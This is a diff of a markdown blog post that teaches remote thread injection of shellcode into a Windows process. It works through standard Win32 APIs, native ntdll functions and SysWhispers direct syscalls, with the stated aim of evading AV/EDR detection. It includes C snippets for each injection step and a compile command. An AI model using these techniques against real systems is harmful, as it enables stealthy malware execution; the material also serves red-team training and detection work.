@@ -33,10 +33,11 @@ In Every Red Team Operation, the goal of the Team is to Stay Stealthy and hide c
              +---------+                                                                           
                                                                                                    
 ```
+*figure 1*
+
 We implement remote thread injection using standard Windows APIs, native APIs, and direct syscalls. each of these implementations has its own pros and cons. 
 the following picture shows how standard windows APIs, Native APIs and direct syscalls work in windows architecture.
 
-<!-- ![windows api call architecture](/assets/images/windows-api-calls.png "windows api call architecture") -->
 ```
                                   +------------------------------+                                  
                                   |                              |                                  
@@ -79,8 +80,8 @@ the following picture shows how standard windows APIs, Native APIs and direct sy
                                   |                              |                                  
                                   +------------------------------+                                  
 ```
+*figure 2*
 
-now let's code.
 ## Standard Windows APIs
 ### pros:
 - easy to use
@@ -88,10 +89,7 @@ now let's code.
 ### cons:
 - detectable by most AV/EDRs
 
-we start by using standard Windows APIs as it is simpler than two other ways.
-First We Need to find our target Process ID. We create a function called ```find_process``` that gets a process name as input and returns the process id. this section of code is common between all of the implementations. 
-<!-- ### Find Target Process ID -->
-It uses **CreateToolhelp32Snapshot** API to get the list of processes and uses **Process32First** and **Process32Next** to go through them one by and check to compare the name of the processes with our target process. all of these APIs get **PROCESSENTRY32**. If it succeeds to find the process it returns its process ID.
+we start by using standard Windows APIs as it is simpler than two other ways. First we need to find our target process ID. We create a function called ```find_process``` that gets a process name and it uses [CreateToolhelp32Snapshot](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) API to get the list of current processes and uses [Process32First](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first) and [Process32Next](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next) to go through them one by one and compare the name of the processes with our target process. **Process32First** and **Process32Next** APIs get a pointer to [PROCESSENTRY32](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32) struct that could hold information about processes like its name and id. If it succeeds to find the process it returns its process ID.
 ```c
 DWORD find_process(char *process_name){
 
@@ -116,31 +114,30 @@ DWORD find_process(char *process_name){
 	return 0;
 }
 ```
-for the Next Step, we need to open our target process using [OpenProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) function. We pass our parameters including the target process id that we get from the previous step and it returns a handle to that process.
+for the next step, we need to open our target process using the [OpenProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) function. We pass our parameters including the target process id that we get from the previous step and it returns a handle to that process.
 ```c
-target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_process_id);
+HANDLE target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_process_id);
 ```
- now we need to allocate a space for our shell code in target process using [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) function. we should allocate this space with **PAGE_EXECUTE_READWRITE** (Read, Write, Execute) permission. this function returns the base address of the allocated region. 
+ now we need to allocate space for our shellcode in the target process using the [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) function. we should allocate this space with **PAGE_EXECUTE_READWRITE** (Read, Write, Execute) permission. this function returns the base address of the allocated region. 
  ```c
- remote_process_buffer = VirtualAllocEx(target_process_handle, NULL, sizeof(buf), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+ LPVOID remote_process_buffer = VirtualAllocEx(target_process_handle, NULL, sizeof(buf), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 ```
-now we should write our shell code into our allocated memory region using [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) function. 
+now we should write our shellcode into our allocated memory region using the [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) function. 
 ```c
 WriteProcessMemory(target_process_handle, remote_process_buffer, buf, sizeof(buf), NULL);
 ```
-after all it's time to create a thread in target process and run the shell code that we previously write into a memory page. we use [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) function. we should also pass 0 to **dwCreationFlags** paremter to run the thread imedietly after creation. 
+after all, it's time to create a thread in the target process and run the shellcode that we previously wrote into a memory page. we use the [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) function. we should also pass 0 as the **dwCreationFlags** parameter to run the thread immediately after creation. 
 ```c
 CreateRemoteThread(target_process_handle, NULL, 0,(LPTHREAD_START_ROUTINE) remote_process_buffer,NULL,0, NULL);
 ```
-that's it for this part. now we need to compile our code. in order to compile it in kali we use **MinGW**.
+to compile the code in kali, we use **MinGW**.
 ```bash
 x86_64-w64-mingw32-gcc main.c -o rti.exe
 ```
-we send the output to our windows machine and run it. if we open **process hacker** and take a look at **notepad.exe** process. in memory section there is only one memory page with RWX permission which is a little suspisous. if we open it we can see our shell code inside it. 
-[picture]
-i should mention that sysmon get's the event of thread creation and ... and all other EDRs [write more]
+we send the output to our windows machine and run it. if we open **process hacker** and take a look at the **notepad.exe** process. in the memory section there is only one memory page with RWX permission which is suspicious. if we open it we can see our shellcode inside it. 
 
-that's it for this part. 
+![processhacker notepad.exe](/assets/images/process-hacker-notepad.png "processhacker notepad.exe")
+*image 1*
 
 ## Native API
 ### pros:
@@ -151,30 +148,28 @@ that's it for this part.
 - still detectable by most AV/EDRs
 - may not work on all windows versions
 
-Native APIs or Undocumented APIs are kind of wrapers on Standardad API. the standard api actually are working on these apis on a higher level. microsoft doesn't recommend using these APIs. if you look at the following picture you can see how these APIs are working. 
-in order to interact with operating system programmers use standard APIs (win 32 apis) that are recommended by microsoft. at bottem of these apis there are native apis that you can find them in NTDLL.dll. native api also interact with os kernel using syscalls. 
-microsoft uses this archtecht to change the os without affecting the standard APIs. 
-in the previous level we used standard APIs to do our job. here we go one layer deeper and use native APIs. 
-Native APIs are called undocumented APIs because mostly you can't find a formal documentation to use them. we can find the way of using them mosty by seeing other people efforts and researching around them to see how they work. most of these APIs names start with Nt or Zw. 
-Let's go to do our jobs and go through the steps.
+In order to interact with the operating system, programmers use Standard APIs (Win 32 APIs) that are recommended by Microsoft. Standard Windows APIs are a kind of wrapper for Native APIs. Native APIs or Undocumented APIs could be found in the ntdll.dll library. Microsoft doesn't recommend using these APIs. if you look at the second diagram you can see how these APIs are working. native APIs also interact with os kernel using syscalls. Microsoft uses this architecture because it can change the OS kernel without affecting the standard APIs. 
 
-here we have a couple of more steps to use NTAPIS first we should load ntdll.dll which contains these APIS then we should define function pointers and get the base address of these function to these pointers.
+Native APIs are also called undocumented APIs because you can't usually find official documentats to use them. we can find a way of using them mostly by seeing other people's code, unofficial documents, or researching around them to see how they work. most of these APIs names start with Nt or Zw. 
 
-for loading ntdll.dll or anyother dll dynamicly into our running process we use [LoadLibraryW](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw) function and it returns a handle to that library. 
+In the previous section, we used standard APIs to do our job. here we go one layer deeper and use native APIs. we have a couple of more steps to use NTAPIS. for using Native APIs. first, we need to load the ntdll.dll into our malware process. then we should define function pointers with the exact same format as the original function that we want to use, and export the base address of these functions to initialize these pointers.
+
+for loading ntdll.dll or any other dll dynamically into our running process, we use the [LoadLibraryW](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw) function and it returns a handle to that library.
+
 ```c
 HMODULE hNtdll = LoadLibraryW(L"ntdll");
 ```
-then we define a fucntion pointer and get the base address of function using **GetProcAddress** function and assign it to the pointer. here is the example for **NtOpenProcess**. 
+then we define our function pointer type and get the base address of the function using the [GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) function and assign it to the pointer. here is the example for [NtOpenProcess](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess).
 ```c
 typedef NTSTATUS(NTAPI* pNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
 pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
 ```
-you should do this for all **NtWriteVirtualMemory**, **NtAllocateVirtualMemory**, **NtCreateThreadEx** functions. and take care that the pointer you define should exacly be like the original function. we should define a prototype of functions and we should define all the parameters for it. for finding the parameter and structure of an undocumented api you can use [http://undocumented.ntinternals.net/](http://undocumented.ntinternals.net/). but you may not find all the things in it. you can search for it and see other examples or even reverse ntdll.dll file to see how it exactly works. 
+as you can see we defined our function type with the same parameters as the **NtOpenProcess** function. you should do this for all **NtWriteVirtualMemory**, **NtAllocateVirtualMemory**, **NtCreateThreadEx** functions. for finding the parameter and structure of an undocumented api you can use [http://undocumented.ntinternals.net/](http://undocumented.ntinternals.net/). but you may not find all the function definitions in it. you can search for it and see other people's codes or even looking inside the ntdll.dll library to see how it exactly works. 
 
 
-### 1- opening target process (NtOpenProcess)
-like the previous section we start by opening our target process but this time using [NtOpenProcess](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess). this function does not return a Handle to our target process but we need to pass a handle pointer as argument(pass by refrence).
-we should also pass a pointer to an [OBJECT_ATTRIBUTES](https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes) structure and a pointer to a **Client ID** so let's define them. we should also initilize **OBJECT_ATTRIBUTES**  using [InitializeObjectAttributes](https://docs.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes) macro and define **UNICODE_STRING** struct.
+### NtOpenProcess
+like the previous section, we start by opening our target process but this time using [NtOpenProcess](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess). this function does not return a Handle to our target process but we need to pass a handle pointer as the first argument(pass by reference).
+we should also pass a pointer to an [OBJECT_ATTRIBUTES](https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes) structure and a pointer to **Client ID** struct so let's define them. we should also initialize **OBJECT_ATTRIBUTES** using [InitializeObjectAttributes](https://docs.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes) macro and define **UNICODE_STRING** struct.
 ```c
 #define InitializeObjectAttributes(p,n,a,r,s) { \
 (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
@@ -206,17 +201,22 @@ typedef struct _OBJECT_ATTRIBUTES {
 	PVOID           SecurityDescriptor;
 	PVOID           SecurityQualityOfService;
 } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES ;
+
+
+OBJECT_ATTRIBUTES oa;
+InitializeObjectAttributes(&oa, NULL,0,NULL,NULL);
+CLIENT_ID ci = { (HANDLE)procid, NULL };
 ```
 now we can use **NtOpenProcess**
 ```c
 NtOpenProcess(&target_process_handle,PROCESS_ALL_ACCESS, &oa, &ci);
 ```
-### 2- Allocating space in target process memory space
-for this step we use [NtAllocateVirtualMemory](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory) function. we define the function prototype. 
+### NtAllocateVirtualMemory
+we allocate memory in target process using the [NtAllocateVirtualMemory](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory) function. we define the function prototype. 
 ```c
 typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
 ```
-then we get the base address of the function 
+then we get the base address of the function.
 ```c
 pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
 ```
@@ -224,23 +224,23 @@ and we call it
 ```c
 NtAllocateVirtualMemory(target_process_handle, &remote_process_buffer, 0,&buf_len ,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 ```
-we pass a void pointer named **remote_process_buffer** that will be the base address of our allocated space.
-### 3- writing shell code in target process
-we define [NtWriteVirtualMemory](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html) function prototype like previous steps. then call it. 
+we passed a void pointer named **remote_process_buffer** that will be the base address of the allocated space.
+
+### NtWriteVirtualMemory
+we define [NtWriteVirtualMemory](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html) function prototype like previous steps. we should pass our shellcode, the length of the shellcode, and the base address of the allocated space as arguments.  
 ```c
 typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten OPTIONAL);
 pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
 NtWriteVirtualMemory(target_process_handle, remote_process_buffer, buf, buf_len, NULL);
 ```
-we should pass our shellcode and lenght of the shellcode and the base address of our allocated space as arguments. 
-### 4- creating remote thread and runing the shellcode
-now it's time to create a thread in our target process and run our shellcode. we use **NtCreateThreadEx** to create a remote thread in target process and run our shellcode. we should also pass 0 as the 7th argument to run the thread imideatly after creation. to see the function prototype you can look [here](https://github.com/processhacker/processhacker/blob/753a395d55634f5e5483c517219414c2ecacfc23/phnt/include/ntpsapi.h#L1814). also the desired access as i mention.
+
+### NtCreateThreadEx
+now it's time to create a thread in our target process and run our shellcode. we use **NtCreateThreadEx** to create a remote thread in the target process and run our shellcode. we should pass 0 as the **CreateFlag** parameter to run the thread immediately after creation and 0x1FFFFF (PROCESS_ALL_ACCESS) as the **DesiredAccess** parameter. to see the function prototype, you can look [here](https://github.com/processhacker/processhacker/blob/753a395d55634f5e5483c517219414c2ecacfc23/phnt/include/ntpsapi.h#L1814).
 ```c
 NtCreateThreadEx(&thread_handle, 0x1FFFFF, NULL, target_process_handle,(LPTHREAD_START_ROUTINE)remote_process_buffer,NULL, FALSE, NULL, NULL, NULL, NULL);
 ```
-and now we have our reverse shell. 
 
-let's go a little deeper and and implement it using syscalls
+that's it for Native APIs. let's go one step deeper and use syscalls.
 
 ## Direct Syscalls
 ### pros:
@@ -250,17 +250,18 @@ let's go a little deeper and and implement it using syscalls
 - may not work on all windows versions
 - hard to use
 
-in the previous steps any API monitoring application and EDRs could detect our API calls and detect our operation. now if we use direct syscalls nothing in user land can detect our api calls. but as [sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) stays as a driver in kernel space we can't do anything with it and it create events for ....
+In the previous steps, any API monitoring application and EDRs could detect our API calls and ruin our operation. now if we use direct syscalls nothing in userland can detect our API calls. but as [sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) works as a driver in kernel space we can’t do anything about it. so, it is strongly recommended to use sysmon. 
 
-one of the cons of using syscalls is that they are version specific. and they may not work on different windows versions. but with using [SysWhisper](https://github.com/jthuraisamy/SysWhispers) we can generate syscalls for different windows versions. i run the following command to generate syscalls for my desired functions for windows 10.
+One of the disadvantages of using syscalls is that their work is dependent on the version of OS and our code may not work on different windows versions. However, by using a great tool like [SysWhisper](https://github.com/jthuraisamy/SysWhispers) we can generate syscalls for different windows versions. you can run the following command to generate syscalls for our desired functions for windows 10.
+
 ```bash
 syswhispers.py --function NtCreateProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscall --versions 10
 ```
-this command makes two output file **syscall.asm** and **syscall.h** that i shuold add to my visual studio project. then i should enable [MASM](https://docs.microsoft.com/en-us/cpp/assembler/masm/masm-for-x64-ml64-exe?view=msvc-160) in my project. 
+this command generates two output files **syscall.asm** and **syscall.h** that we  add to our visual studio project. then we should enable [MASM](https://docs.microsoft.com/en-us/cpp/assembler/masm/masm-for-x64-ml64-exe?view=msvc-160) in the project and include the header file in our main code.
 
-after that using the functions such as native apis but here we don't need to load **ntdll.dll** and get base address of function and definging prototypes. and i think using SysWhisper has made really easy to use syscalls. 
+afterward using the functions is like Native APIs but here we don’t need to load ntdll.dll, get the base address of the functions, and defining function prototypes. I think SysWhisper has made it really easy to utilize syscalls.
 
-you can see the code for these sections in [here](https://github.com/AlionGreen/remote-thread-injection).
+You can find the codes for this post on my [Github](https://github.com/AlionGreen/remote-thread-injection).
 
 ## References:
 [https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)
@@ -268,4 +269,3 @@ you can see the code for these sections in [here](https://github.com/AlionGreen/
 [https://www.ired.team/offensive-security/code-injection-process-injection/process-injection/](https://www.ired.team/offensive-security/code-injection-process-injection/process-injection/)
 
 [https://blog.dylan.codes/defending-your-malware/](https://blog.dylan.codes/defending-your-malware/)
-
